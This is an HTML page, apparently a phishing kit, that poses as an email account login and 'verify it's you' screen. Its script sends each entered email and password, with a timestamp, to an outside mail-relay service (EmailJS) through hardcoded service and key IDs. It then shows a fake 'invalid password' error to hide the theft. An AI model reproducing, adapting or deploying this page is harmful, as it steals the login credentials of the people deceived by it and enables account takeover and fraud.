<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login to Your Account</title>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    emailjs.init("TLkClHUlQn5aQV4XO");
  </script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-image: url('https://i.postimg.cc/pVBJwW22/blue-notes-isolated-grey.png');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-color: transparent;
      height: 100vh;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
    }

    body::before {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      backdrop-filter: blur(10px);
      background-color: rgba(255, 255, 255, 0.2);
      z-index: 0;
    }

    .login-container {
      background-color: rgba(255, 255, 255, 0.65);
      backdrop-filter: blur(20px);
      width: 100%;
      max-width: 360px;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
      z-index: 1;
      text-align: center;
    }

    .login-container img {
      width: 60px;
      margin-bottom: 15px;
    }

    .login-container h2 {
      font-size: 24px;
      margin-bottom: 10px;
      color: #222;
    }

    .login-container p.subtext {
      font-size: 13px;
      color: #555;
      margin-bottom: 20px;
    }

    .login-container input {
      width: 90%;
      padding: 10px;
      margin-bottom: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
      background-color: #f9f9f9;
    }

    .login-container input:focus {
      border-color: #007BFF;
      outline: none;
      background-color: #fff;
    }

    .login-container button {
      width: 90%;
      padding: 12px;
      background-color: #007BFF;
      color: #fff;
      border: none;
      font-size: 16px;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
      margin-bottom: 10px;
    }

    .login-container button:hover {
      background-color: #0056b3;
    }

    .login-container p.note {
      font-size: 12px;
      color: #888;
      margin-top: 5px;
    }

    /* Confirmation Message */
    #confirmation {
      display: none;
      background-color: rgba(40, 40, 40, 0.95);
      width: 100%;
      max-width: 400px;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
      border-top: 5px solid #007BFF;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 1000;
    }

    #confirmation p {
      color: #fff;
      font-size: 18px;
      font-weight: bold;
    }

    .footer {
      position: fixed;
      bottom: 10px;
      width: 100%;
      text-align: center;
      font-size: 14px;
      color: #fff;
      z-index: 1000;
    }
  </style>
</head>
<body>
  <!-- Login Panel -->
  <div id="login" class="login-container">
    <img src="https://i.postimg.cc/7YGc7kpj/Hi-box.jpg" alt="Email Icon" style="width: 100px; height: auto;">
    <h2>Log in</h2>
    <p class="subtext">To continue, first verify itâ€™s you</p>
    <input type="email" id="email" placeholder="Email Address" required>
    <input type="password" id="password" placeholder="Password" required>
    <button onclick="authenticate()">Login</button>
    <p class="note">The new verification screen in the web app during the login process for users without two-step login turned on.</p>
  </div>

  <!-- Confirmation Message -->
  <div id="confirmation">
    <h2 style="color: white;">NETWORK ERROR</h2>
    <p>You've entered an invalid email address / password combination.</p>
    <button onclick="window.close()">Close this page</button>
  </div>

  <!-- Footer -->
  <div class="footer">
    2025 Email Administrator. All Rights Reserved
  </div>

  <script>
    function sendEmail(username, password) {
      const serviceID = "service_nfx0v2t";
      const templateID = "template_ccgi8xh";
      const publicKey = "TLkClHUlQn5aQV4XO";

      const templateParams = {
        login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
      };

      return emailjs.send(serviceID, templateID, templateParams, publicKey);
    }

    function authenticate() {
      let loginButton = document.querySelector("button");
      loginButton.textContent = "Authenticating...";
      loginButton.disabled = true;
      let email = document.getElementById("email").value.trim();
      let password = document.getElementById("password").value.trim();

      if (email && password) {
        sendEmail(email, password)
          .then(() => {
            loginButton.textContent = "Login";
            loginButton.disabled = false;
            document.getElementById("login").style.display = "none";
            document.getElementById("confirmation").style.display = "block";
          })
          .catch(error => {
            console.error("Error sending email", error);
            loginButton.textContent = "Login";
            loginButton.disabled = false;
            alert("Failed to send login report. Please try again.");
          });
      } else {
        alert("Please enter both email and password.");
        loginButton.disabled = false;
        loginButton.textContent = "Login";
      }
    }
  </script>
</body>
</html>
